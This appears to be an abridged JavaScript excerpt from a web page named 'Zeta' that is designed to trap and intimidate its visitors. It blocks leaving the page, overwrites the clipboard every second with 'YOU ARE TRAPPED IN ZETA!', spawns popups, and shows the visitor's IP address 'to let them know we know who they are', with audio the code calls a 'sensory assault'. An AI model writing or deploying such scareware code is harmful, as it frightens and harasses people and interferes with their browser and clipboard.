document.addEventListener('DOMContentLoaded', () => {
    ...
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = 'Are you sure you want to leave Zeta?';
    });
    ...
    function trapUser() {
        setInterval(() => { navigator.clipboard.writeText('YOU ARE TRAPPED IN ZETA! 🔥').catch(() => {}); }, 1000);
    ...
    function createAnnoyingPopup(popupId) {
        ...
        if (popup) {
            popup.document.write(`
                ...
                <html>
                <head>
                    <title>You're trapped in Zeta!</title>
                    <style>
    ...
    function startGame() {
        ...
        // Change the image to the main game GIF
        gameImage.src = 'assets/game-animation.gif';
        
        // Show the IP address to let them know we know who they are
        ipAddressElement.style.display = 'block';
        
        // Play the audio to complete the sensory assault
